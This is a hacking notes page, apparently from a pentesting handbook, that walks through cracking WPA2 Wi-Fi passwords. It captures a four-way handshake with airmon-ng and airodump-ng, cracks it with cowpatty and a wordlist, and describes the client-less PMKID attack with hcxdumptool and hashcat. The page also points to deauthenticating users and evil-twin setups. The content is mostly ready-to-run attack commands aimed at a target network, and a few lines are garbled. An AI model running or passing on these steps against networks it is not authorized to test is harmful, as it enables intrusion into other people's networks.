# Wifi

There are quite a few different security mechanism on wifi. And each of them require a different tactic. This article outlines the different strategies quite well. [http://null-byte.wonderhowto.com/how-to/hack-wi-fi-selecting-good-wi-fi-hacking-strategy-0162526/](http://null-byte.wonderhowto.com/how-to/hack-wi-fi-selecting-good-wi-fi-hacking-strategy-0162526/)

This is a great guide to the many different ways to hack wifi.

### Checking what networks are available

`sudo iwlist wlan0 scanning` - scans for wifis

### Hacking WPA2-wifis Using airmon-ng and cowpatty

What we are going to to here it basically just to record the 4-way handshake and then run a dictionary attack on it. The good part about this strategy is that you won't have to interfere to much with the network and thereby risk of taking down their wifi. The bad part is that if you run a dictionary attack there is always the possibility that the password just isn't in the list.

1. Start airmon-ng

   * `airmon-ng start wlan0`
   * This puts the network card in monitoring mode.
   * This will create a network interface that you can use to monitor wifi-action. This interface is usually called mon0 or something like that. You see the name when you run the command.

2. Run airodump to see what is passing through the air

   * Now we want to see what access points are available to us. 
   * `airodump-ng -i mon0`
   * This would output something like this:

```
CH 13 ][ Elapsed: 6 s ]

BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID

E8:DE:27:31:15:EE  -62       40       54    0  11  54e  WPA2 CCMP   PSK  myrouter
A7:B6:68:D4:1D:91  -80        7        0    0  11  54e  WPA2 CCMP   PSK  DKT_D24D81
B4:EE:B4:80:76:72  -84        5        0    0   6  54e  WPA2 CCMP   PSK  arrisNetwork

BSSID       STATION            PWR   Rate    Lost    Frames Probe

E8:DE:27:31:15:EE  D8:A2:5E:8E:41:75  -57    0e- 1    537     14
```

So what is all this?  
`BSSID` - This is the mac-address of the access point.  
`PWR` - Signal strength. The higher \(closer to 0\) the strength the stronger is the signal. In the example above it is myrouter that has the strongest signal.  
`Beacon` - This is kind of like a packet that the AP sends out periodically. The beacon contains information about the network. It contains the SSID, timestamp, beacon interval. If you are curious you can just analyze the beacons in wireshark after you have captured them.  
`#Data` - The number of data-packets that has been sent.  
`#/s` - Number of data-packets per second.  
`CH` - Channel  
`MB` - Maximum speed the AP can handle.  
`ENC` - Encryption type  
`CIPHER` - One of CCMP, WRAP, TKIP, WEP, WEP40, or WEP104. Not mandatory, but TKIP is typically used with WPA and CCMP is typically used with WPA2.  
`PSK` - The authentication protocol used. One of MGT \(WPA/WPA2 using a separate authentication server\(RADIUS\)\), SKA \(shared key for WEP\), PSK \(pre-shared key for WPA/WPA2\), or OPN \(open for WEP\).  
`ESSID` - The name of the network

Then we have another section of information.  
`Station` - MAC address of each associated station or stations searching for an AP to connect with. Clients not currently associated with an AP have a BSSID of “\(not associated\)”. So yeah, this basically means that we can see what devices are looking for APs. This can be useful if we want to create an evil twin or something like that.

1. Find the network you want to access.

   * `airodump-ng --bssid A7:B6:68:D4:1D:91 -c 11 -w cowpatty mon0`
   * So this command will record or traffic from the device with that specific MAC-address. -c defines the channel. and `-w cowpatty` means that we are going to save the packet capture with that name. 
     Now we just have to wait for a user to connect to that network. And when he/she does we will record that handshake.
     We know that we have recorded a handshake when this appears
     `CH 11 ][ Elapsed: 19 hours 52 mins ][ 2016-05-19 17:14 ][ WPA handshake: A7:B6:68:D4:1D:91`
     Now we can exit airodump, and we can see that we have a cap-file with the name cowpatty-01.cap. That is our packet-capture, and you can open it and study it in wireshark if you like.

2. Crack the password.

3. Now that we have the handshake recorded we can start to crack it. We can do that by using the program cowpatty.

4. `cowpatty -f /usr/share/wordlists/rockyou.txt -r cowpatty-01.cap -s DKT_D24D81`  
   Then we just hope for the best.

## PMKID

The RSN IE is an optional field that can be found in 802.11 management frames. One of the RSN capabilities is the PMKID.

The PMKID is computed by using HMAC-SHA1 where the key is the PMK and the data part is the concatenation of a fixed string label "PMK Name", the access point's MAC address and the station's MAC address.

Since the PMK is the same as in a regular EAPOL 4-way handshake this is an ideal attacking vector.

We receive all the data we need in the first EAPOL frame from the AP.

```
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```

**Note: **The following method does not change the time in takes to crack the password, it simply makes the method to obtain the password much easier. Further details are in the hashcat link below.

Why Easier:

* No more regular users required - because the attacker directly communicates with the AP \(aka "client-less" attack\)

* No more waiting for a complete 4-way handshake between the regular user and the AP

* No more eventual retransmissions of EAPOL frames \(which can lead to uncrackable results\)

* No more eventual invalid passwords sent by the regular user

* No more lost EAPOL frames when the regular user or the AP is too far away from the attacker

* No more fixing of nonce and replaycounter values required \(resulting in slightly higher speeds\)

* No more special output format \(pcap, hccapx, etc.\) - final data will appear as regular hex encoded stringairmon-ng check kill

1.\) Run hcxdumptool to request the PMKID from the AP and to dump the received frame to a file \(in pcapng format\).

```
/opt/hcxdumptool/hcxdumptool -o Target.pcapng -i wlan0 --filterlist=TargetBSSID.txt --filtermode=2
```

The TargetSSID.txt files contains the MAC addresses \(BSSIDs\) of the target without colons. Also there is an indicator at the bottom of the interface that states "pwned." This will indicate the number of hashes obtained. It is recommended to have this run for at least 10 minutes.

```
/opt/hcxtools/hcxpcaptool -z Target.16800 Target.pcapng
```

2.\) Run hcxpcaptool to convert the captured data from pcapng format to a hash format accepted by hashcat.

```
 ./hcxpcaptool -z  Target.16800 /opt/hcxdumptool/Target.pcapng
```

This takes in the in capture file, parses it and outputs the format \(16800\) in one that hashcat can interpret.

3.\) Run hashcat to crack it.

```
./hashcat -m 16800 Target.16800 -a 3 -w 3 '?l?l?l?l?l?lt!
```

The above is obviously a simplified version as this can be vastly tailored by information obtained from the target

## Example hash

```
2582a8281bf9d4308d6f5731d0e61c61*4604ba734d4e*89acf0e761f4*ed487162465a774bfba60eb603a39f3a
```

The columns are the following \(all hex encoded\):

* PMKID

* MAC AP

* MAC Station

* ESSID

## Further digging

If you want to analyze your pcap for the RSN PMKID, the filter for wirshark is

```
wlan.rsn.ie.pmkid
```

## Notes

Depending how long you have hcxpcaptool running, you may obtain multiple differing hashes for a single targeted AP. This is because it will keep sending messages and the slight modifications are due to the replay counter and nonce changes in each subsequent submission. The different hashes will all crack to the same password at the end of the day.

## More Info / References

Kicking other people off the network to capture handshakes faster:  
[http://www.aircrack-ng.org/doku.php?id=newbie\_guide](http://www.aircrack-ng.org/doku.php?id=newbie_guide)

[http://lewiscomputerhowto.blogspot.cl/2014/06/how-to-hack-wpawpa2-wi-fi-with-kali.html](http://lewiscomputerhowto.blogspot.cl/2014/06/how-to-hack-wpawpa2-wi-fi-with-kali.html)

[http://radixcode.com/hackcrack-wifi-password-2015-step-step-tutorial/](http://radixcode.com/hackcrack-wifi-password-2015-step-step-tutorial/)

[https://hashcat.net/forum/thread-7717.html](https://hashcat.net/forum/thread-7717.html)

[http://etutorials.org/Networking/802.11+security.+wi-fi+protected+access+and+802.11i/Part+II+The+Design+of+Wi-Fi+Security/Chapter+10.+WPA+and+RSN+Key+Hierarchy/Details+of+Key+Derivation+for+WPA/](http://etutorials.org/Networking/802.11+security.+wi-fi+protected+access+and+802.11i/Part+II+The+Design+of+Wi-Fi+Security/Chapter+10.+WPA+and+RSN+Key+Hierarchy/Details+of+Key+Derivation+for+WPA/)

https://www.wireshark.org/docs/dfref/w/wlan\_mgt.html



